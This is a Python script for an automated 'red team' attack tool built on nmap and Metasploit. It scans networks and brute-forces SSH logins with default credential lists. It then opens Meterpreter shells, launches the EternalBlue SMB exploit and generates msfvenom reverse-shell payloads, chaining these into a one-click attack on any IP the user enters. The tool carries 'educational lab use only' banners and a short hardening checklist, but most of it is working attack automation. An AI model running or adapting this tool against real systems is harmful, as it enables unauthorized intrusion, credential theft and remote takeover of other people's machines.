#!/usr/bin/env python3
"""
Red Team Assault - Automated Penetration Testing Framework
Version: 1.0 - FULL RED TEAM AUTOMATION
FOR EDUCATIONAL LAB USE ONLY
"""

import subprocess
import sys
import os
import time
import re
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========================================================================
# Colors
# ========================================================================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
CLEAR = '\033[2J\033[H'

# ========================================================================
# Red Team Assault Class
# ========================================================================
class RedTeamAssault:
    def __init__(self):
        self.targets = []
        self.vulnerable_targets = []
        self.compromised_targets = []
        self.scan_results = {}
        self.exploit_results = {}
        self.log_file = f"redteam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.msf_console = None
        self.current_session = None
        
        self.clear_screen()
        self.show_banner()
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        
    def show_banner(self):
        print(f"{BOLD}{RED}")
        print("╔═══════════════════════════════════════════════════════════════╗")
        print("║  🔴 RED TEAM ASSAULT - Automated Penetration Testing         ║")
        print("║  🎯  Version: 1.0 - FULL RED TEAM AUTOMATION                 ║")
        print("║  ⚡  nmap + Metasploit Powered                               ║")
        print("║  ⚠️  FOR EDUCATIONAL LAB USE ONLY                           ║")
        print("╚═══════════════════════════════════════════════════════════════╝")
        print(f"{RESET}")
        print()
        
    def log(self, message, color=WHITE, emoji=""):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {emoji} {message}"
        print(f"{color}{log_entry}{RESET}")
        with open(self.log_file, 'a') as f:
            f.write(f"{log_entry}\n")
            
    def run_command(self, cmd, timeout=60):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, 
                                  text=True, timeout=timeout)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Command timed out", -1
        except Exception as e:
            return "", str(e), -1
            
    def check_dependencies(self):
        """Check if required tools are installed"""
        self.log("🔍 Checking dependencies...", BLUE)
        
        tools = ["nmap", "msfconsole", "msfvenom"]
        missing = []
        
        for tool in tools:
            stdout, stderr, code = self.run_command(f"which {tool}")
            if code != 0:
                missing.append(tool)
                self.log(f"  ❌ {tool} not found", RED)
            else:
                self.log(f"  ✅ {tool} found", GREEN)
                
        if missing:
            self.log(f"❌ Missing tools: {', '.join(missing)}", RED)
            self.log("Install with: apt install nmap metasploit-framework -y", YELLOW)
            return False
            
        self.log("✅ All dependencies satisfied", GREEN)
        return True
        
    def scan_network(self, network):
        """Perform network scan using nmap"""
        self.log(f"📡 Scanning network: {network}", BLUE)
        self.log("  (This may take 2-5 minutes...)", WHITE)
        
        # Full port scan with service detection
        cmd = f"nmap -sS -sV -O -p- --min-rate 1000 -T4 {network}"
        self.log(f"  ↳ Command: {cmd}", YELLOW)
        
        stdout, stderr, code = self.run_command(cmd, timeout=300)
        
        if code != 0:
            self.log(f"❌ Scan failed: {stderr}", RED)
            return False
            
        # Parse results
        hosts = []
        current_host = None
        current_ports = []
        
        for line in stdout.split('\n'):
            if "Nmap scan report for" in line:
                if current_host:
                    hosts.append({'ip': current_host, 'ports': current_ports})
                    current_ports = []
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if ip_match:
                    current_host = ip_match.group(1)
            elif "/tcp" in line and "open" in line:
                parts = line.split()
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else "unknown"
                current_ports.append({'port': port, 'service': service})
            elif "OS:" in line:
                os_info = line.split("OS:")[1].strip()
                if current_host:
                    for host in hosts:
                        if host['ip'] == current_host:
                            host['os'] = os_info
                            
        # Add last host
        if current_host and current_ports:
            hosts.append({'ip': current_host, 'ports': current_ports})
            
        self.targets = hosts
        self.scan_results = {'hosts': hosts, 'raw': stdout}
        
        self.log(f"✅ Found {len(hosts)} active hosts", GREEN)
        for host in hosts:
            port_count = len(host.get('ports', []))
            os_info = host.get('os', 'Unknown')
            self.log(f"  ↳ {host['ip']} - {port_count} ports open - OS: {os_info}", WHITE)
            
        return True
        
    def analyze_vulnerabilities(self):
        """Analyze scan results for potential vulnerabilities"""
        self.log("🔍 Analyzing vulnerabilities...", BLUE)
        
        vulnerable = []
        
        for host in self.targets:
            vulnerabilities = []
            
            # Check for common vulnerable services
            for port in host.get('ports', []):
                service = port['service'].lower()
                port_num = port['port']
                
                # SSH
                if port_num == '22' and 'ssh' in service:
                    vulnerabilities.append({
                        'type': 'SSH',
                        'port': 22,
                        'risk': 'High',
                        'description': 'SSH service - potential for brute force'
                    })
                    
                # SMB
                if port_num in ['139', '445'] and 'microsoft' in service:
                    vulnerabilities.append({
                        'type': 'SMB',
                        'port': int(port_num),
                        'risk': 'Critical',
                        'description': 'SMB service - potential for EternalBlue'
                    })
                    
                # RDP
                if port_num == '3389':
                    vulnerabilities.append({
                        'type': 'RDP',
                        'port': 3389,
                        'risk': 'High',
                        'description': 'RDP service - potential for BlueKeep'
                    })
                    
                # HTTP/HTTPS
                if port_num in ['80', '443'] and 'http' in service:
                    vulnerabilities.append({
                        'type': 'Web',
                        'port': int(port_num),
                        'risk': 'Medium',
                        'description': 'Web service - potential for web attacks'
                    })
                    
                # FTP
                if port_num == '21':
                    vulnerabilities.append({
                        'type': 'FTP',
                        'port': 21,
                        'risk': 'Medium',
                        'description': 'FTP service - potential for anonymous login'
                    })
                    
                # MySQL
                if port_num == '3306':
                    vulnerabilities.append({
                        'type': 'MySQL',
                        'port': 3306,
                        'risk': 'High',
                        'description': 'MySQL service - potential for weak credentials'
                    })
                    
            if vulnerabilities:
                vulnerable.append({
                    'ip': host['ip'],
                    'vulnerabilities': vulnerabilities
                })
                
        self.vulnerable_targets = vulnerable
        
        if vulnerable:
            self.log(f"⚠️  Found {len(vulnerable)} potentially vulnerable hosts", YELLOW)
            for host in vulnerable:
                self.log(f"  ↳ {host['ip']} - {len(host['vulnerabilities'])} vulnerabilities", RED)
        else:
            self.log("✅ No obvious vulnerabilities found", GREEN)
            
        return True
        
    def ssh_bruteforce(self, target_ip, username_list=None, password_list=None):
        """SSH brute force attack using Metasploit"""
        self.log(f"🔓 Starting SSH brute force on {target_ip}", BLUE)
        
        # Default wordlists if not provided
        if not username_list:
            username_list = ["root", "admin", "user", "test", "ubuntu", "kali", "vagrant"]
        if not password_list:
            password_list = ["password", "123456", "admin", "root", "toor", "password123", "123456789"]
            
        # Create Metasploit resource script
        resource_script = f"""
use auxiliary/scanner/ssh/ssh_login
set RHOSTS {target_ip}
set USER_FILE /tmp/ssh_users.txt
set PASS_FILE /tmp/ssh_pass.txt
set THREADS 10
set VERBOSE false
run
exit
"""
        
        # Write wordlists to files
        with open('/tmp/ssh_users.txt', 'w') as f:
            f.write('\n'.join(username_list))
        with open('/tmp/ssh_pass.txt', 'w') as f:
            f.write('\n'.join(password_list))
            
        with open('/tmp/ssh_bruteforce.rc', 'w') as f:
            f.write(resource_script)
            
        # Run Metasploit
        self.log(f"  ↳ Running SSH brute force...", WHITE)
        stdout, stderr, code = self.run_command(
            f"msfconsole -q -r /tmp/ssh_bruteforce.rc",
            timeout=120
        )
        
        # Parse results for successful logins
        success = False
        credentials = None
        
        if "SUCCESS" in stdout or "successful" in stdout.lower():
            # Extract credentials
            cred_match = re.search(r'Username: (\S+), Password: (\S+)', stdout)
            if cred_match:
                credentials = {
                    'username': cred_match.group(1),
                    'password': cred_match.group(2)
                }
                success = True
                self.log(f"  ✅ SSH credentials found: {credentials['username']}:{credentials['password']}", GREEN)
                
        if success:
            self.compromised_targets.append({
                'ip': target_ip,
                'method': 'SSH Brute Force',
                'credentials': credentials
            })
            
        # Cleanup
        os.remove('/tmp/ssh_users.txt')
        os.remove('/tmp/ssh_pass.txt')
        os.remove('/tmp/ssh_bruteforce.rc')
        
        return success, credentials
        
    def msf_exploit_ssh(self, target_ip, username, password):
        """Get shell using Metasploit SSH exploit"""
        self.log(f"🎯 Gaining shell on {target_ip} via SSH...", BLUE)
        
        resource_script = f"""
use exploit/multi/ssh/sshexec
set RHOSTS {target_ip}
set USERNAME {username}
set PASSWORD {password}
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set AutoRunScript post/windows/manage/migrate
run -j
exit
"""
        
        with open('/tmp/ssh_exploit.rc', 'w') as f:
            f.write(resource_script)
            
        self.log(f"  ↳ Launching SSH exploit...", WHITE)
        stdout, stderr, code = self.run_command(
            f"msfconsole -q -r /tmp/ssh_exploit.rc",
            timeout=60
        )
        
        # Cleanup
        os.remove('/tmp/ssh_exploit.rc')
        
        # Check if session created
        if "Meterpreter session" in stdout:
            session_match = re.search(r'Meterpreter session (\d+) opened', stdout)
            if session_match:
                session_id = session_match.group(1)
                self.log(f"  ✅ Shell acquired! Session {session_id}", GREEN)
                self.current_session = session_id
                return True
                
        return False
        
    def msf_exploit_smb(self, target_ip):
        """SMB exploit using EternalBlue (MS17-010)"""
        self.log(f"💥 Attempting SMB exploit on {target_ip}", BLUE)
        
        resource_script = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target_ip}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j
exit
"""
        
        with open('/tmp/smb_exploit.rc', 'w') as f:
            f.write(resource_script)
            
        self.log(f"  ↳ Launching EternalBlue exploit...", WHITE)
        stdout, stderr, code = self.run_command(
            f"msfconsole -q -r /tmp/smb_exploit.rc",
            timeout=120
        )
        
        os.remove('/tmp/smb_exploit.rc')
        
        if "Meterpreter session" in stdout:
            session_match = re.search(r'Meterpreter session (\d+) opened', stdout)
            if session_match:
                session_id = session_match.group(1)
                self.log(f"  ✅ Shell acquired! Session {session_id}", GREEN)
                self.current_session = session_id
                return True
                
        self.log(f"  ❌ SMB exploit failed", RED)
        return False
        
    def generate_payload(self, target_ip, payload_type="reverse_shell"):
        """Generate a custom payload"""
        self.log(f"📦 Generating payload for {target_ip}", BLUE)
        
        payloads = {
            "reverse_shell": {
                "name": "Reverse Shell",
                "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f elf -o /tmp/payload.elf",
                "file": "/tmp/payload.elf"
            },
            "meterpreter": {
                "name": "Meterpreter",
                "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f elf -o /tmp/meterpreter.elf",
                "file": "/tmp/meterpreter.elf"
            }
        }
        
        if payload_type not in payloads:
            self.log(f"❌ Unknown payload type", RED)
            return None
            
        payload = payloads[payload_type]
        self.log(f"  ↳ Generating {payload['name']}...", WHITE)
        
        stdout, stderr, code = self.run_command(payload['cmd'])
        
        if code == 0 and os.path.exists(payload['file']):
            self.log(f"  ✅ Payload generated: {payload['file']}", GREEN)
            return payload['file']
        else:
            self.log(f"  ❌ Payload generation failed", RED)
            return None
            
    def interactive_shell(self):
        """Launch interactive shell on compromised target"""
        if not self.current_session:
            self.log("❌ No active session", RED)
            return
            
        self.log(f"🚀 Launching interactive shell on session {self.current_session}", GREEN)
        
        # Create resource script to interact
        resource_script = f"""
sessions -i {self.current_session}
exit
"""
        
        with open('/tmp/shell_interact.rc', 'w') as f:
            f.write(resource_script)
            
        # Launch msfconsole with session
        cmd = f"msfconsole -q -r /tmp/shell_interact.rc"
        self.log(f"  ↳ Starting interactive shell...", WHITE)
        os.system(cmd)
        
        os.remove('/tmp/shell_interact.rc')
        
    def full_attack_chain(self, target_ip):
        """Execute full attack chain on a target"""
        self.log(f"⚡ Starting FULL ATTACK CHAIN on {target_ip}", RED)
        self.log("=" * 60, YELLOW)
        
        # 1. SSH Brute Force
        success, creds = self.ssh_bruteforce(target_ip)
        if success and creds:
            self.log("✅ SSH credentials found! Attempting shell...", GREEN)
            self.msf_exploit_ssh(target_ip, creds['username'], creds['password'])
            
        # 2. SMB Exploit
        self.log("Attempting SMB exploit...", BLUE)
        self.msf_exploit_smb(target_ip)
        
        # 3. Generate payload if needed
        if not self.current_session:
            self.log("⚠️  No shell acquired, generating payload...", YELLOW)
            payload_file = self.generate_payload(target_ip)
            if payload_file:
                self.log(f"  ↳ Payload available: {payload_file}", GREEN)
                self.log("  ↳ Transfer and execute manually if possible", YELLOW)
                
        self.log("=" * 60, YELLOW)
        
        if self.current_session:
            self.log(f"✅ Shell acquired on {target_ip} (Session {self.current_session})", GREEN)
        else:
            self.log(f"❌ No shell acquired on {target_ip}", RED)
            
        return self.current_session
        
    def generate_report(self):
        """Generate comprehensive report"""
        self.log("📝 Generating Attack Report...", BLUE)
        
        report = f"""
╔═══════════════════════════════════════════════════════════════╗
║  RED TEAM ASSAULT - PENETRATION TEST REPORT                  ║
╚═══════════════════════════════════════════════════════════════╝

Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Log File: {self.log_file}

TARGETS SCANNED: {len(self.targets)}
VULNERABLE TARGETS: {len(self.vulnerable_targets)}
COMPROMISED TARGETS: {len(self.compromised_targets)}

╔═══════════════════════════════════════════════════════════════╗
║  VULNERABLE HOSTS                                            ║
╚═══════════════════════════════════════════════════════════════╝

"""
        for host in self.vulnerable_targets:
            report += f"""
Host: {host['ip']}
  Vulnerabilities:
"""
            for vuln in host['vulnerabilities']:
                report += f"    • {vuln['type']} (Port {vuln['port']}) - {vuln['description']}\n"
                
        report += f"""
╔═══════════════════════════════════════════════════════════════╗
║  COMPROMISED HOSTS                                           ║
╚═══════════════════════════════════════════════════════════════╝

"""
        for host in self.compromised_targets:
            report += f"""
Host: {host['ip']}
  Method: {host['method']}
  Credentials: {host.get('credentials', 'N/A')}
"""
            
        report += """
╔═══════════════════════════════════════════════════════════════╗
║  RECOMMENDATIONS                                             ║
╚═══════════════════════════════════════════════════════════════╝

1. Patch all vulnerable services
2. Change default credentials
3. Implement strong password policies
4. Enable firewall rules
5. Use SSH keys instead of passwords
6. Disable SMBv1 protocol
7. Regular security audits

⚠️  This report is for educational purposes only
⚠️  All tests were conducted in a controlled lab environment
"""
        
        report_file = f"redteam_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(report)
            
        self.log(f"✅ Report saved: {report_file}", GREEN)
        return report_file
        
    def display_menu(self):
        """Display main menu"""
        print(f"{WHITE}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║  MAIN MENU                                                       ║")
        print(f"╚═══════════════════════════════════════════════════════════════════╝{RESET}")
        print()
        print(f"{CYAN}1)  Scan Network for Targets{RESET}")
        print(f"{CYAN}2)  Show Vulnerable Targets{RESET}")
        print(f"{CYAN}3)  SSH Brute Force Attack{RESET}")
        print(f"{CYAN}4)  SMB Exploit (EternalBlue){RESET}")
        print(f"{CYAN}5)  Full Attack Chain (Auto){RESET}")
        print(f"{CYAN}6)  Generate Payload{RESET}")
        print(f"{CYAN}7)  Interactive Shell (Compromised){RESET}")
        print(f"{CYAN}8)  Show Compromised Hosts{RESET}")
        print(f"{CYAN}9)  Generate Report{RESET}")
        print(f"{CYAN}10) Exit{RESET}")
        print()
        
        if self.current_session:
            print(f"{GREEN}Active Session: {self.current_session}{RESET}")
        if self.compromised_targets:
            print(f"{GREEN}Compromised: {len(self.compromised_targets)} hosts{RESET}")
        print()
        
    def interactive_menu(self):
        """Interactive menu loop"""
        while True:
            self.clear_screen()
            self.show_banner()
            self.display_menu()
            
            choice = input(f"{GREEN}Select option: {RESET}")
            
            if choice == '1':
                network = input(f"{GREEN}Network (e.g., 192.168.1.0/24): {RESET}")
                if not network:
                    network = "192.168.1.0/24"
                self.scan_network(network)
                self.analyze_vulnerabilities()
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '2':
                if self.vulnerable_targets:
                    self.log("🎯 Vulnerable Targets:", CYAN)
                    for host in self.vulnerable_targets:
                        print(f"  {host['ip']} - {len(host['vulnerabilities'])} vulnerabilities")
                        for vuln in host['vulnerabilities']:
                            print(f"    ↳ {vuln['type']} (Port {vuln['port']})")
                else:
                    self.log("ℹ️  No vulnerable targets found", YELLOW)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '3':
                target = input(f"{GREEN}Target IP: {RESET}")
                if target:
                    self.ssh_bruteforce(target)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '4':
                target = input(f"{GREEN}Target IP: {RESET}")
                if target:
                    self.msf_exploit_smb(target)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '5':
                target = input(f"{GREEN}Target IP: {RESET}")
                if target:
                    self.full_attack_chain(target)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '6':
                target = input(f"{GREEN}Target IP: {RESET}")
                if target:
                    print(f"{CYAN}Payload Types:{RESET}")
                    print("  1. Reverse Shell")
                    print("  2. Meterpreter")
                    payload_choice = input(f"{GREEN}Select [1-2]: {RESET}")
                    payload_type = "reverse_shell" if payload_choice == '1' else "meterpreter"
                    self.generate_payload(target, payload_type)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '7':
                if self.current_session:
                    self.interactive_shell()
                else:
                    self.log("❌ No active session", RED)
                    input(f"\n{GREEN}Press Enter to continue...{RESET}")
                    
            elif choice == '8':
                if self.compromised_targets:
                    self.log("🎯 Compromised Hosts:", GREEN)
                    for host in self.compromised_targets:
                        print(f"  {host['ip']} - {host['method']}")
                        if host.get('credentials'):
                            print(f"    Credentials: {host['credentials']['username']}:{host['credentials']['password']}")
                else:
                    self.log("ℹ️  No compromised hosts", YELLOW)
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '9':
                self.generate_report()
                input(f"\n{GREEN}Press Enter to continue...{RESET}")
                
            elif choice == '10':
                self.log("👋 Goodbye!", GREEN)
                sys.exit(0)
                
            else:
                self.log("❌ Invalid option", RED)
                time.sleep(2)

# ========================================================================
# Main Execution
# ========================================================================
def main():
    print(f"{BOLD}{RED}")
    print("⚠️  WARNING: This tool is for EDUCATIONAL LAB USE ONLY")
    print("⚠️  Use only on systems you OWN or have WRITTEN PERMISSION to test")
    print(f"{RESET}")
    print()
    
    # Check root
    if os.geteuid() != 0:
        print(f"{RED}❌ This tool requires root privileges{RESET}")
        print(f"Run with: sudo python3 redteam_assault.py{RESET}")
        sys.exit(1)
        
    # Run tool
    assault = RedTeamAssault()
    
    if not assault.check_dependencies():
        sys.exit(1)
        
    try:
        assault.interactive_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️  Interrupted by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}❌ Error: {e}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
